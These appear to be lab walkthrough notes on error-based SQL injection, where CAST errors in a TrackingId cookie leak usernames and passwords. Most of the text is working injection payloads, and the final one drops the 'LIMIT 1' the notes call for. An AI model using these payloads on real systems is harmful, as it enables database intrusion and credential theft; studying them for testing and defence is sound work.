# cast

> leak database info with error and `cast`

```
SELECT * FROM tracking WHERE TrackingId = 'ogAZZfxtOKUELbuJ';
```

`TrackingId=ogAZZfxtOKUELbuJ'` -> throw an error

- `SELECT * FROM tracking WHERE TrackingId = 'ogAZZfxtOKUELbuJ'';`

`TrackingId=ogAZZfxtOKUELbuJ'--` -> comment out the last '

- `SELECT * FROM tracking WHERE TrackingId = 'ogAZZfxtOKUELbuJ'--';`

> `AND` expects boolean not an int

`TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`

- `(SELECT 1) AS int` -> return 1

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`

- result to 1=1

> lets try to look in to the table

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`

- should return the usernames but not just one row

> limit it to one row

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

- it will throw an error on the username not convertible to int but during it will show the first username -> `ERROR: invalid input syntax for type integer: "administrator"`

> lets get the password

`TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

> the query request might have a character limit, then try it without the cookie

`TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
